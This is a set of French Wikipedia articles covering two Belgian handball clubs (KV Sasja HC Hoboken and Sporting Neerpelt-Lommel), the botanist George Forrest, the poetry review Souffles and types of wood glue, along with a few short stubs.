Par la suite, le KV Sasja HC Hoboken, bien que faisant partie des favoris aux sacres nationaux, subit surtout la domination des clubs limbourgeois du Sporting Neerpelt ainsi que de l'Initia HC Hasselt, les seuls grands exploits du club lors de cette décennie furent deux arrivées en finale en 1984 face à l'Initia HC Hasselt où le club perd sur un net score de 27 à 12 et en 1987 où face au Sporting Neerpelt, Sasja perd 21 à 19 dans une rencontre où Joseph Delpire inscrit dix goals.
Ces deux finales eurent comme particularité d'être remportées par le Champion de Belgique, ce qui signifia que le KV Sasja HC Hoboken se qualifia pour la Coupe des coupes lors des saisons 1984/1985 et 1987/1988 où le club se fait respectivement éliminer par les tchécoslovaques du ČH Bratislava sur un total de 30 à 20 (15-11; 15-9) lors du premier tour et par les danois du Holte IF lors du deuxième tour sur un total de 39 à 26 (23-9; 16-17), après avoir éliminé le club féroïen du Kyndil Tórshavn, 29 à 37 (14-19; 15-18).
Vers la fin des années 1980 et 90, les résultats du clubs ne suivent pas, la direction nomme comme entraîneur "Ariel Jacobs" pour ramener de la fraîcheur mais c'est encore pire puisqu'alors que le club est à deux doigts de se faire reléguer lors de la saison 1998/1999, il se retrouve en très mauvaise posture lors de la saison suivante, occupant la toute dernière place.
Après un peu moins de 40 ans au sein de l'élite du handball belge, les verts et rouges allaient être relégués, c'est sans compter que le président "Paul De Loose" trouva une alternative pour maintenir ses couleurs en division 1, il racheta le matricule 191 du club limbourgeois du HC Kiewit, pensionnaire de D1 et va revendre le matricule du club, le 041 à la section féminine du Sasja qui prit donc son indépendance et changea son nom en SD Antwerpen (Sasja Dames Antwerpen), puis en DHW Antwerpen (Dames Hoboken Wilrijk Antwerpen) lors de la fusion avec la section féminine du HV Uilenspiegel Wilrijk en 2004 et par conséquent depuis 1999, le club évolue sans sections féminines et sous le matricule 191.
Lors de la saison 1999/2000, le club prit le nom de HVKS (Hans Verkerk Keukens Sasja) mais il reprit son nom d'origine la saison suivante, c'est-à-dire KV Sasja HC Hoboken.
Les années 2000 : Second âge d'or.
Ce nouveau matricule fut synonyme de fin de la crise que traversait le club puisque le KV Sasja HC Hoboken décroche après 31 ans d'attente, son quatrième titre de Champion de Belgique lors de la saison 2005/2006.
Un sacre décroché avec l'aide de l'icône du club, le Bruxellois Joseph Delpire qui est donc revenu dans le club de la métropole pour ponctuer sa carrière handbalistique.
La saison qui suivit, le KVS se hisse en finale de la Coupe de Belgique où il disputa cette finale face au ROC Flémalle, en territoire liégeois puisqu'elle se disputait cette année-là au Country Hall Ethias Liège mais face aux Anversois, la formation de Thierry Herbillon fit pâle figure et se fit battre 32 à 22.
Alors qu'en Championnat de Belgique, le club réussit à conserver son titre les deux saisons qui suivirent.
Ce qui aura comme conséquence, la participation à plusieurs campagnes européennes où le club joua deux fois la qualification à la Ligue des Champions lors des saisons 2007/2008 et 2008/2009 mais fut éliminé respectivement par les formations roumaines du HCM Constanța et du Steaua Bucarest, deux campagnes suivies de relégation au deuxième tour de la Coupe EHF mais là aussi le club est tenu en échec par les Serbes du RK Proleter Zrenjanin et les Israéliens du Maccabi Rishon LeZion.
Lors de la saison 2007/2008, une compétition entre les Pays-Bas et la Belgique prend forme grâce à un accord entre les deux fédérations, une compétition nommée BeNe Liga et où les Anversois, après avoir éliminé le HV Fiqas Aalsmeer 60 à 59 (31-31, 28-29), se qualifièrent au Final Four où ils battirent l'Initia HC Hasselt 33 à 25 et donc jouent la finale face au Eurotech Bevo HC, 24 à 31.
Par après, le KV Sasja HC subit une nouvelle domination des clubs limbourgeois et plus précisément de l'Initia HC Hasselt, du United HC Tongeren et de l'Achilles Bocholt car bien que le club reste dans le haut du classement, il ne remporta plus rien, il eut juste le mérite de se qualifier plusieurs fois en BeNe Liga devenu en 2010, BeNeLux Liga aux dépens du Sporting Neerpelt-Lommel et du HC Visé BM qui sont les deux grands rivaux pour atteindre ce dernier carré.
Depuis 2014: La BeNe League.
En mars, la Fédération luxembourgeoise de handball (FLH) annonce le retrait de ses clubs en Benelux liga, cette décision fait suite au comportement des dirigeants néerlandais qui a exaspéré les clubs luxembourgeois. Le manque de confiance entre les différentes fédérations a ainsi mis un terme au projet de la Ligue du Benelux.
C'est alors non pas une BeNeLux League mais une BeNe League qui aura lieu.
Dans cette nouvelle compétition, le KV Sasja HC Hoboken termine aux portes du Final Four, à trois points des quatrièmes du Targos Bevo HC.
Les dames.
La section dames du KV Sasja HC Hoboken bien qu'elle remporta deux titres nationaux à beaucoup à envier à son homologue masculin, en effet malgré une coupe de Belgique en 1988 et également un titre de champion de Belgique en 1985, la section dames sentit, du favoritisme de la part des dirigeants du club envers la section hommes.
Alors en 2004, la section dame du KV Sasja HC Hoboken fusionna avec un autre club de la province situé dans la commune de Wilrijk aux abords de la ville d'Anvers, le HV Uilenspiegel Wilrijk, le club prit le matricule 041, matricule du SD Antwerpen avant la fusion, et devient le DHW Antwerpen ou les Dames Hoboken Wilrijk Antwerpen, Aujourd'hui, le KV Sasja HC Hoboken ne compte aucune section dames alors que le HV Uilenspiegel Wilrijk possède plusieurs équipes dames.
Mais même si, le club ne possède aucune équipe dames, il forme les filles comme les garçons, un accord est en plus prévu avec le DHW Antwerpen pour éventuellement reprendre les filles dès l'âge pro-piste pour évoluer en dames.
Rivalité.
Les matchs les plus tendus du KV Sasja HC Hoboken sont ceux face aux clubs anversois tels que l'Olse Merksem HC, le HV Uilenspiegel Wilrijk, HC't Noorden ou encore le HvH Zandvliet, mais aussi aux clubs favoris au titre tels que le Sporting Neerpelt-Lommel, l'Achilles Bocholt, l'Initia HC Hasselt ou encore le United HC Tongeren.
À une époque, les matches contre le club mosans, du ROC Flémalle était fort tendu, depuis le test match pour le titre de champion en 1968 à Hoboken que les Liégeois perdirent sur le score de 20-7 devant un public anversois totalement hystérique.
Maillot.
Les couleurs du KV Sasja HC Hoboken sont le rouge et le Noir car les couleurs du district anversois, Hoboken sont le rouge et noir, d'autres clubs de la ville comme l'ancien club de football, le KSK Hoboken, avaient adopté cette même couleur.
Palmarès.
Palmarès masculin.
Le tableau suivant récapitule les performances de la section masculine du Koninklijke Vereniging Sport Afdelingen Syndicale Jeugd Antwerpen Handbal Club Hoboken dans les diverses compétitions belges et européennes.
Palmarès féminin.
Le tableau suivant récapitule les performances de la section féminine du Koninklijke Vereniging Sportafdelingen Syndicale Jeugd Antwerpen Handbal Club Hoboken dans les diverses compétitions belges et européennes.
Trophées individuels.
Trophées individuels des joueurs du Koninklijke Voetbalclub Sasja Handbal Club Hoboken
Compétitions européennes.
Le KV Sasja HC Hoboken fut confronté à des poids lourds en Europe tels que les danois du Skjern Håndbold, les suisses du ZMC Amicitia Zürich ou encore les clubs roumains du HCM Constanta et du Steaua Bucarest.
Salle.
Le Sportcomplex Sorghvliedt est une salle ayant une capacité de 950 places, outre le KV Sasja, la salle accueille le club de handball féminin du DHW Antwerpen mais aussi le club de volley-ball du Topvolley Precura.

</doc>
<doc id="6804949" url="https://fr.wikipedia.org/wiki?curid=6804949" title="Liste des lieux patrimoniaux du comté de Lennox et Addington">
Liste des lieux patrimoniaux du comté de Lennox et Addington

Cet article recense les lieux patrimoniaux du comté de Lennox et Addington inscrits au répertoire des lieux patrimoniaux du Canada, qu'ils soient de niveau provincial, fédéral ou municipal.

</doc>
<doc id="6804959" url="https://fr.wikipedia.org/wiki?curid=6804959" title="Sporting Pelt">
Sporting Pelt

Le Sporting Pelt, anciennement "Sporting Neerpelt" puis "Sporting Neerpelt-Lommel", abrégé en "Sporting NeLo", est un club de handball, situé à Pelt dans le Limbourg belge. 
Fondé sous le nom de Sporting Neerpelt, le club est un tout grand nom du handball belge. Présent en Division 1 depuis la saison 1976/77, le club ne quittera plus le haut niveau. Premier représentant limbourgeois au sein de l'élite belge, il devient également le premier club de la province à remporter le titre de champion en 1977/78, une saison seulement après sa montée. La période dorée du club coïncide avec les années 80 mais décrochera également des titres dans les années 90, 2000 et 2020. En 2025, le "Sporting Pelt" compte onze titres nationaux et neuf Coupes de Belgique
Porteur du matricule 112, le club est affilié à la VHV et évolue en Super Handball League. 
Histoire.
1969-1983: Des débuts en apothéose.
Fondé en 1969, le Sporting Neerpelt obtient le matricule 112.
Le Sporting se montra tout de suite comme étant une bonne formation, gravissant les échelons du handball belge, le club se retrouva en division 1 lors de la saison 1976/1977, soit sept ans après sa création, ce fut le tout premier club limbourgeois atteignant l'élite.
Et après une saison dans cette division 1, le Sporting Neerpelt parvient à remporter le tout premier titre de champion de Belgique de son histoire lors de la saison 1977/1978, synonyme d'une première participation en Coupe des clubs champions pour la prochaine saison.
Une saison 1978/1979 abordé en tant que tenant du titre par le Sporting Neerpelt ainsi que représentant du handball belge en Europe puisqu'en Coupe des clubs champions, le Sporting affronta leur voisin néerlandais du Hermes Den Haag qu'il défit sur un total de 42 à 36 (18-16; 18-26) et passa au prochain tour de la compétition où cette fois-ci Neerpelt tomba sur le club tchécoslovaque du VSZ Košice mais fut éliminé sur le total de 42 à 31 (23-13; 19-18).
Alors qu'au niveau national, le titre se joua de très peu puisque le Sporting Neerpelt étaient au coude à coude avec le KV Mechelen où ce fut finalement les anversois qui eurent le dernier mot et donc Neerpelt perdit sa couronne de champion.
Non qualifié lors de la saison 1979/1980, le club put se concentrer sur le niveau national puisqu'il remporta son deuxième titre de champion de Belgique au détriment du SK Avanti Lebbeke, battu lors du test match à Hoboken alors que le club réussit également à inscrire une autre compétition sur son tableau de chasse, la Coupe de Belgique où Neerpelt parvient à s'imposer 27 à 24 sur le terrain d'Etterbeek face au KV Sasja HC Hoboken, lors de la finale.
La saison 1980/1981 laissa sans équivoque le Sporting Neerpelt comme monarque absolue du handball belge remportant pour la troisième fois de son histoire le titre de champion de Belgique dans une saison où le club ne concéda à aucune défaite mais ça on ne peut pas en dire autant en Coupe de Belgique où arrivant en finale de la compétition, le Sporting affronta tout comme la saison précédente le KV Sasja HC Hoboken mais celui-ci prit sa revanche en s'imposant sur le score étriqué de 15 à 14.
Au niveau européen, Neerpelt réussit à passer au deuxième tour en écartant les luxembourgeois du HB Dudelange mais au second tour le club tomba sur les tchécoslovaque du Dukla Prague, ceux-ci se débarrassa de Neerpelt sur le score total de 49 à 30 (29-16; 20-14).
La saison 1981/1982 est un remake de la saison passée, en effet le Sporting Neerpelt remporta son troisième titre de champion de Belgique et en Coupe de Belgique, le club perd la finale 18 à 15 à Namur face encore une fois au KV Sasja HC Hoboken.
Tandis qu'en Coupe des clubs champions, le Sporting Neerpelt rencontra les néerlandais du HV Blauw-Wit dans une double confrontation qui s'avéra victorieuse pour le Sporting Neerpelt, soit 19 à 21 à l'extérieur et 15 à 14 à domicile et donc le club remporta cette double confrontation sur le total de 33 à 36.
La réussite ne fut la même au tour suivant puisque face aux danois du Helsingør HF, Neerpelt concéda à deux défaites et fut donc éliminé sur le total de 45 à 37 (26-16; 19-21).
La saison suivante fut moins bonne car même si les campinois décrochèrent leur quatrième titre de champion de Belgique dont le troisième d’affilée, le club n'arriva pas à atteindre la finale de la Coupe de Belgique comme les saisons précédente et même au niveau de la Coupe des clubs champions ce fut laborieux pour Neerpelt face au club néerlandais du V&amp;L Handbal Geleen qui malgré une victoire à domicile, 20 à 16, perdit la rencontre à l'extérieur sur le lourd score de 21 à 12 et donc se fit évincer de la compétition sur le total de 32 à 37.
1983-1986 : Dans l'ombre de Hasselt.
Si les années 1980 furent synonyme d'une nouvelle domination dans le handball belge, celle du Sporting Neerpelt, ce fut en fait surtout de l'éveil du handball limbourgeois que ces années furent synonyme.
Puisqu'en plus du Sporting Neerpelt, un autre club, l'Initia HC Hasselt enchaîne les places d'honneur au point tels que cette formation arrivera à détrôner le Sporting Neerpelt en remportant le titre de Champion de Belgique ainsi que la Coupe de Belgique lors de la saison 1983/1984, une saison où les campinois réussissent tout de même à se qualifier pour la Coupe IHF, moins prestigieuse que la Coupe des clubs champions.
Alors que cette même saison, le club disputa la Coupe des clubs champions où il rencontra la formation française de l'US Ivry qu'il réussit à battre sur le total de 35 à 40 (19-23;16-21).
Arrivé dès lors au deuxième tour, le club fut stoppé par les norvégiens de l'Oppsal IF battu sur le total de 31 à 37, malgré une victoire à domicile de 20 à 15, Neerpelt fut défait 22 à 11 à Oslo.
Lors de la saison qui suivit, la Coupe IHF, le club, après s’être défait des Italiens du HC Rovereto au premier tour, des israéliens du Hapoël Rehovot en huitième de finale, le Sporting fut éliminé par la formation espagnoles du CB Tecnisa Alicante sur un total de 59 à 46 (36-17;23-29).
Une assez bonne performance dans une compétition où Neerpelt participa de nouveau lors saison 1985-1986 du fait d'une nouvelle prestation peu convaincante dans un championnat toujours autant dominé par l'Initia HC Hasselt et lors de cette nouvelle participation à cette Coupe IHF, le Sporting fut éliminé d'entré de jeu par les yougoslaves du RK Proleter Zrenjanin lors d'une double confrontation qui se solda sur le petit écart de 41 à 45 où en plus d'une défaite à l'extérieur, 17 à 21, Neerpelt concéda à un partage à domicile, 24 à 24.
Au niveau national, le club resta fidèle à ses dernières saisons en se qualifiant pour la Coupe IHF.
1986-1990 : Seconde vague.
C'est alors que pour la saison 1986/1987, le Sporting Neerpelt revient en force, tous d'abord avec l'arrivée de leur nouveau gardien qui fera également office d’entraîneur, soit l'ex-international polonais Mietek Wojczak.
Avec cette nouvelle recrue, Neerpelt remporta son sixième titre de Champion de Belgique deux jours avant la fin de la saison, un titre après trois ans d'absence, un titre mais surtout un doublé puisque le Sporting remporta sa deuxième Coupe de Belgique, sept ans après la première, une finale que les campinois remportèrent 21 à 19.
En Coupe IHF, Neerpelt se fit éliminer d'entré de compétition par les suisses BSV Berne tandis que la saison suivante, ce fut la Coupe des clubs champions que le Sporting retrouva, une campagne où après s’être défait du club néerlandais du HV Sittardia sur le net score de 38 à 29 (19-28; 10-18), le club fut éliminé par les espagnols du CD Bidasoa sur le total de 33 à 31 (15–14;14–17).
Alors que cette même saison, Neerpelt réussit à refaire le doublé Coupe-Championnat, s'imposant une nouvelle fois en finale de la Coupe face au KV Sasja HC Hoboken.
La saison 1988/1989 fut des plus serré en championnat puisqu'elle donna une féroce bataille pour le titre entre l'Initia HC Hasselt et le Sporting Neerpelt lors des Play-offs.
Au point tel que c'est la dernière journée qui en décidera, Hasselt est vu comme le prétendant le plus sérieux au titre pour diverses raisons qui sont que c'est eux qui ont l'avantage de recevoir et donc de jouer devant leur public mais aussi pour le fait que ces play-offs débutèrent par la victoire de l'Initia sur le terrain de Neerpelt, 18 à 26.
Et contre tout attende, ce fut le Sporting Neerpelt qui remporta le titre s'imposant sur la large victoire de 18 à 26 et donc le Sporting remporta son huitième sacre tandis qu'en Coupe de Belgique, Neerpelt retrouva en finale la surprenante équipe du HC Herstal, outsider wallon.
Lors d'une finale assez équilibré, la mi-temps se concluant sur le score de 10 à 7 en faveur de Neerpelt, qui réussit concrètement à se défaire de son adversaire grâce à un excellent Chris Claes, auteur de huit buts qui celèrent le match à 23 à 17.
Ceci fut donc, synonyme d'un troisième doublé Coupe-Championnat de suite pour le Sporting.
Tandis qu'au niveau européen, les campinois furent éliminés au premier tour de la compétition par les Suisses du ZMC Amicitia Zürich, 44 à 39 (25–19;19–20).
Lors de l'entre-saison, le Sporting acquit quelques nouveaux éléments tels que "Wil Jacobs" ou bien, le gardien du KV Sasja HC Hoboken, "Freddy D'Hollander", supposant dès lors que Wojczak ne serait plus que l’entraîneur
La saison débuta par la coupe d'Europe, qualifié en Coupe des clubs champions, le Sporting dut affronter les autrichiens de l'UHK Volksbank Vienne, lors d'une double confrontation dont la première, à domicile, se déroula de façons remarquable puisque Neerpelt remporta la rencontre 22 à 17.
Mais ce fut bien plus difficile en terre autrichienne, étant donné que le Sporting Neerpelt perdit la rencontre sur un score de 15 à 21 et donc se fit évincer de la compétition sur un total de 37 à 38.
Alors qu'en Coupe de Belgique, le Sporting, tenant du titre, n'arriva pas à refaire le doublé.
En effet après s’être défait du KV Sasja HC Hoboken, 20 à 21, le Sporting fut éliminé en demi-finales sur le même écart par l'Union beynoise, 26 à 25&lt;ref name="Vainqueur de Neerpelt en coupe/"&gt;.&lt;/ref&gt;.
Mais, en championnat, le Sporting resta impitoyable tout au long de la saison, enregistrant 17 victoires et une seule défaite face à l'Olse Merksem HC, le club termina la phase classique à la première place avec un total de 34 points.
Et donc, les campinois affrontèrent l'Union beynoise, quatrième de la phase classique, en demi-finales des Plays-offs.
Neerpelt reçut en premier, au début de la rencontre, les deux formations firent jeux égal et la première mi-temps se termina 8 à 10 en faveur des flamands, puis lors de la seconde période, beyne ramena le score à 13 partout mais avec l'aide de Jacobs et Smeets, le Sporting s'imposa finalement sur le score de 25 à 21.
Le lendemain, au match retour, les tenants du titre furent toujours aussi entreprenants à tel point qu'au repos, il menèrent 11 à 14 mais lors de la deuxième période l'Union beynoise réussit à rattraper son retard et le score afficha alors 26 partout, mais "Jacobs" en décida autrement puisqu'il scella le score à 26 à 27 en faveur du Sporting qui se qualifia en finale.
Une finale où Neerpelt retrouva un autre formation liégeoise, le HC Herstal tombeur du KV Sasja HC Hoboken.
Lors du match aller, Neerpelt prend tous de suite le match en main, menant 3 à 1, mais Herstal raccrocha au score qui devient 6 à 5, c'est alors que le Sporting fut touché d'un lourd handicap, en effet deux des cadres du noyau se blesse, "Loots" et "Smeets" mais Neerpelt parvient à garder l'avantage à la pause.
On ne peut pas dire autant au début de la seconde période où le HC Herstal réussit à passer devant 9 à 10, une avance que les liégeois gardèrent jusqu'à 13 à 14 puisque Neerpelt infligea trois buts d'affilée à Herstal et passe devant 16 à 14 et, bien que "Grandjean" ramena le score à 16 à 15, les Liégeois se voient prendre une nouvelle fois trois buts d'affilée et "Dubuc" rata également un penalty ce qui scella le score à 19 à 15 pour le Sporting, une avance confortable avant d'aller à Liège pour la rencontre retour.
Un match retour où comme à l'aller, ce sont les joueurs de Neerpelt qui prennent le meilleur départ passant de 0 à 3 à 1 à 6 et malgré un sursaut d’orgueil de la part de Herstal, 6 à 9, les armuriers ratèrent deux penaltys et n'étaient pas assez solides en défense, ce qui conclut la première période sur le score de 7 à 12.
En deuxième période, le HC Herstal parvient à revenir 14 à 16 et même à égaliser 18 partout, une égalité qui resta jusqu'à 23 partout mais "Spooren" et "Philippe" ainsi que "Catteeuw", scellèrent le score à 24 à 26 pour le Sporting, un score dont la moitié fut inscrit par "Catteeuw".
Ainsi, le Sporting Neerpelt réussit à décrocher son neuvième titre de champion de Belgique, son quatrième consécutif.
1990-2003 : Toujours présent mais moins performant.
Lors de l'entre saison, malgré l'arrivée de Luc Brouwers et de "Van Leugenhage", Neerpelt vit partir d'importants éléments de son noyau comme Mietek Wojczak qui part au HC Kiewit, Will Jacobs partit au V&amp;L Handbal Geleen et Joseph Delpire qui part chez le concurrent direct du HC Herstal, ces différents départs mettra le Sporting en difficultés dans le but de conserver son titre.
Mais, malgré ces différents départs, le Sporting reste toujours le champion en titre et pour ce faire, disputa la Coupe des clubs champions où les joueurs limbourgeois durent affronter leurs voisins néerlandais du HV Sittardia lors d'une double confrontation qui tourna à l'avantage du club néerlandais.
En effet, défait à domicile sur le score de 21 à 24, Neerpelt ne put rien faire au match retour où ils concédèrent à un score de 17 à 21 et se font donc évincer de la compétition sur le total de 38 à 45.
Au niveau national, le club fut éliminé assez tôt en Coupe de Belgique, à savoir en huitième de finale contre l'Union beynoise et donc même si le Sporting est éliminé, il put se concentrer sur un championnat bien plus disputé qu'auparavant.
Juste un peu avant les play-offs, le Sporting Neerpelt dut aller affronter le HC Herstal dans un match qui allait déterminer l'équipe qui terminera en tête de la phase classique mais dans un match très disputé, ce fut finalement les liégeois du HC Herstal qui émergèrent grâce à un penalty inscrit par l'ancien joueur de la formation limbourgeoise, Joseph Delpire qui scella le score à 19 à 18.
Finalement, le Sporting termina à la troisième position de la phase classique avec 34 points et donc conserva toutes ses chances pour le titre mais c'est play-offs furent un fiasco pour Neerpelt qui ne réussit qu'à décrocher que deux points seulement et ne se qualifia pas pour la Coupe d'Europe.
Lors de la saison 1991/1992, le Sporting réalisa un superbe parcours en Coupe de Belgique puisqu'après avoir éliminé le "SHCA Flémalle", 37 à 8 en huitième de finale, l'Olympia Heusden, 11 à 19 en quart de finale et le tenant du titre de l'Initia HC Hasselt en demi-finales, le Sporting Neerpelt se hissa en finale de la Coupe de Belgique.
Une finale qui comme l'année passée, se déroulait à La Ruche, soit à domicile pour Herstal et donc un avantage même si ça ne leur avait pas réussi la saison dernière, lors d'une finale des plus disputée.
Et cette année encore, la finale est des plus disputée même si le HC Herstal réussit à creuser rapidement l'écart passant de 9 à 6 à 12 à 8 mais ce ne fut pas sans compter "Skalski", le meilleur homme de match qui ramena la Sporting à 12 à 11 au repos.
La seconde mi-temps fut plus brouillonne les deux formations se livrèrent un chassé-croisé l'une passant devant l'autre au tableau de score, alors que le jeune Richard Gérad fixa le score 20 à 19 pour Herstal, Bakalar parvient à arracher la prolongation.
Lors desquelles le Sporting Neerpelt passa devant par le billet de "Spooren" qui fixa le score à 20 à 22, c'est alors que Neerpelt décrocha complètement et le score passa de 24 à 22 grâce à "Frenay", Jean-Michel Dubuc et, par deux fois, Joseph Delpire.
Alors qu'en championnat, au terme de la phase classique, avec le même nombre de points ainsi que le même nombre de victoires, le Sporting Neerpelt et l'Initia HC Hasselt terminent tous deux à la quatrième place, dernière place qualificative pour les play-offs.
Dès lors, les deux clubs revendique leurs places en Play-offs le CEP (Comité exécutif paritaire) et l'UBH (Union belge de handball) devaient trancher entre l'article 631 C (goal average et dans ce cas Hasselt serait qualifié) ou l'article 641 B (organisation d'un test-match).
Ce fut finalement un test-match qui dut être joué à Hechtel-Eksel mais lors de ce test-match seul Neerpelt était présent, en effet Hasselt mécontent s'est pourvu en cassation.
Mais rien n'y fait et se fut finalement le Sporting Neerpelt qui remporta le test-match sur forfait de l'Initia et donc fut qualifié pour les play-offs.
Des play-offs où avec trois victoires et trois défaites, le Sporting termina à la troisième place devant le HC Herstal avec un total de sept points.
Nom.
Au début le club était appelé, Sporting Neerpelt, puis après la fusion avec le HCA Lommel le club fut rebaptiser Sporting Neerpelt-Lommel mais est souvent abrégée par Sporting NeLo.Bien que le club possède le nom de la ville de Lommel dans son titre, rien a changé mis à part le nom, le club possède toujours le même matricule du temps du Sporting Neerpelt et donc c'est quelque 19 titres nationaux.
Rivalités.
Les matchs les plus tendus du Sporting Neerpelt-Lommel sont ceux face aux clubs limbourgeois, mais surtout ceux évoluant en division 1 tels que l'Achilles Bocholt, l'Initia HC Hasselt ou encore le United HC Tongeren.
Palmarès.
Palmarès masculin.
Le tableau suivant récapitule les performances de la section masculine du Handbal Sporting Neerpelt-Lommel dans les diverses compétitions belges et européennes.
Palmarès féminin.
Le tableau suivant récapitule les performances de la section féminine du Handbal Sporting Neerpelt-Lommel dans les diverses compétitions belges et européennes.
Trophée individuel.
Trophées individuels des joueurs du 

</doc>
<doc id="6804962" url="https://fr.wikipedia.org/wiki?curid=6804962" title="George Forrest (botaniste)">
George Forrest (botaniste)

George Forrest, né le à Falkirk (Écosse) et mort le , près de Tengchong (Yunnan), est un botaniste écossais, spécialiste de la flore de Chine et explorateur du sud-ouest du Yunnan, alors province reculée peu explorée.
Biographie.
Après un apprentissage chez un chimiste, Forrest décide de voyager en Australie grâce à un petit héritage. Il part en 1891 où il exerce diverses professions dont chercheur d'or et éleveur de moutons. Il rentre en Europe en 1902. Le professeur Bayley Balfour l'engage en 1903 à l'herbier du jardin botanique royal d'Édimbourg. Un an plus tard, il le recommande à Arthur Kilpin Buley, horticulteur fortuné et négociant en coton, qui a l'intention de financer une expédition au Yunnan, pour y collecter des plantes rares et en particulier des rhododendrons dont la province est riche.
Forrest part en 1904, accompagné de dix-sept autres collecteurs. Il est accueilli par les missionnaires de la Société des missions étrangères de Paris qui sont les rares Européens à s'y être établis. Mais il est pris dans la région de Tsekou par la révolte de 1905 qui vise tous les étrangers et manque de mourir. Il est témoin des atrocités que certaines lamaseries de l'école des bonnets jaunes commettent à l'égard des missionnaires et de leurs paysans convertis. Huit nuits durant, pourchassé par d'énormes dogues tibétains, il court vers le sud, où il est recueilli par des villageois Lissous qui l'aident à s'échapper de la région.
Il récolte nombre d'espèces de rhododendrons inconnues ainsi que des arbustes et autres plantes.
Forrest fit sept expéditions au Yunnan, recueillant plantes et graines pour l'herbier d'Édimbourg qui représentent un total de 31 000 spécimens. Il découvrit un jour une nouvelle espèce, "Rhododendron giganteum", dont un spécimen de 24 mètres de haut avec un tronc de 2 mètres de circonférence. Il en fit abattre une partie et les cercles annuels révélèrent qu'il avait 280 ans. Outre cette espèce, il découvrit plus de trois cents espèces nouvelles de rhododendrons, et une cinquantaine d'espèces de primevères. L'épithète "forrestii" est accolée en son honneur à une trentaine d'espèces botaniques.
Il épouse Clementine Traill en 1907, dont il a trois fils.
En 1932, alors qu'il est aux environs de Tchengdong, dans les collines, il meurt foudroyé d'une crise cardiaque. Il est enterré à Tchengdong, auprès de son ami George Litton qui était consul et qui mourut vingt-six ans avant lui.

</doc>
<doc id="6804964" url="https://fr.wikipedia.org/wiki?curid=6804964" title="Album photo de Höcker">
Album photo de Höcker



</doc>
<doc id="6804965" url="https://fr.wikipedia.org/wiki?curid=6804965" title="Album Höcker">
Album Höcker



</doc>
<doc id="6804966" url="https://fr.wikipedia.org/wiki?curid=6804966" title="Dactyloceras">
Dactyloceras

Dactyloceras est un genre de lépidoptères (papillons) de la famille des Brahmaeidae.

</doc>
<doc id="6804969" url="https://fr.wikipedia.org/wiki?curid=6804969" title="Souffles (revue française)">
Souffles (revue française)

La revue Souffles est une publication semestrielle de l'Association des Écrivains méditerranéens, créée en 1942, au sein de la Résistance.
Historique.
La revue, basée à Montpellier, est fondée en 1942 dans la clandestinité par le poète Robert Marty (président jusqu'en 1983) et son beau-frère le poète et peintre Paul Bouges.
Jacques Gasc (1943-2010), poète montpelliérain - entré à l'âge de quinze ans à la Compagnie des Écrivains méditerranéens parrainé par Paul Bouges - succède à Robert Marty jusqu'en 2003. Jean-Pierre Védrines en est à son tour le directeur de 2003 à 2010. Après un intérim de Gaston Marty, Christophe Corp accède à la présidence des Écrivains méditerranéens en 2011 et à ladirection de cette revue.
Les prix.
L'association décerne trois grands prix et trois prix spéciauxpar an, et présente les lauréats dans le numéro suivant de "Souffles", avec des extraits de leurs œuvres. Par le biais de ces prix littéraires décernés chaque année, "Souffles" s'attache à faire découvrir de nouveaux talents poétiques.

</doc>
<doc id="6804973" url="https://fr.wikipedia.org/wiki?curid=6804973" title="Colle à bois">
Colle à bois

La colle à bois est un adhésif utilisé pour lier étroitement des morceaux de bois ensemble. De nombreuses substances ont été utilisées comme colles.
Colles naturelles.
Colles de collagène.
La colle animale (Les types spécifiques incluent la colle de peau, la colle d'os, la colle de poisson, la colle de peau de lapin) a été le principal adhésif de choix pour de nombreux types de travail du bois, y compris les meubles et la lutherie, pendant de nombreux siècles. Elle est fabriquée à partir de collagène (une protéine) obtenu à partir de peaux ou d'os. Il est chimiquement similaire à la gélatine comestible et n'est pas toxique en cas d'ingestion. La colle à peau est encore utilisée aujourd'hui dans des applications spécialisées : instruments de musique (lutherie), pour les et pour les réparations/conservation de qualité des boiseries anciennes. La colle à peau est mesurée sur la base de sa force en gelée, une mesure du nombre de grammes de force nécessaire pour enfoncer un cylindre d' 1⁄2 pouce (13 mm) , de 4 mm (0.16 in) dans une solution protéique à 12,5 % de colle à 10 °C . La colle est fabriquée en qualités standard de 32 à 512 grammes (1.1–18.1 oz) . 192 grammes (6.8 oz) la force est la plus couramment utilisée pour le travail du bois ; 251 grammes (8.9 oz) est la valeur la plus élevée normalement utilisée pour la construction d'instruments ; 135 grammes (4.8 oz) est la valeur la plus faible utilisée pour la menuiserie générale. Une colle au-dessus de 250-gram (8.8 oz) nécessite une dilution excessive et laisse donc trop peu de colle dans les joints pour une adhérence efficace, elle n'est donc pas couramment utilisée. Des versions liquides de colle de peau sont désormais disponibles ; généralement, elles contiennent de l'urée pour maintenir la colle liquide à température ambiante et pour prolonger le temps de séchage. Des exemples de colle à peau liquide sont ou . La colle de peau ne glisse pas. Les joints de colle de peau sont faciles à réparer, simplement en chauffant et en ajoutant plus de colle de peau.
Colle de kératine.
Conventionnellement, les colles de kératine, bien que fabriquées à partir de parties animales comme les cornes et les sabots (colle de sabot), ne sont pas considérées comme des "colles animales" car ce ne sont pas des colles de collagène.
Colle de caséine.
La colle de caséine est fabriquée à partir de protéines de lait. Elle était utilisée pour fabriquer des joints solides et robustes au début de l'aviation, et était omniprésente sous la forme de « colle blanche », comme l', célèbre aux États-Unis ; mais elle est tombée en disgrâce en raison de sa sensibilité aux attaques bactériennes et à l'humidité et a été remplacée dans l'aviation en bois par des colles synthétiques.
Colles végétales.
La colle d'amidon est une colle à base de farine, blé ou riz gluant (colle de riz), et d'eau, à laquelle on ajoute généralement de l'huile d'amande amère ou des conservateurs afin de la conserver des moisissures. L'amidon est un glucide (sucre).
La caséine de soja peut donner des colles au même titre que la caséine animale. Elle est utilisée dans les contreplaqués.
Colles de synthèse.
